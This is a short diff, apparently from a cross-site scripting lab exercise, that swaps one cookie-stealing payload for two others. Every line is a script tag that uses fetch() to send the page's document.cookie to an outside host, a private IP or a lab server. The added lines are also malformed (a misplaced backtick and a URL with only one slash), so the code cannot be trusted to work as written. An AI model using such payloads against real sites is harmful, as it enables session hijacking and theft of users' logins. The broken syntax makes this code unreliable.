@@ -1,1 +1,2 @@
-<script>fetch("http://10.42.207.223" + document.cookie)</script>
+<script>fetch(`http://web-80-163-90.cod-sa-east-1.hbtn.io/`/${document.cookie})</script>
+'<script>fetch("http:/10.42.163.90/+{document.cookie}")</script>
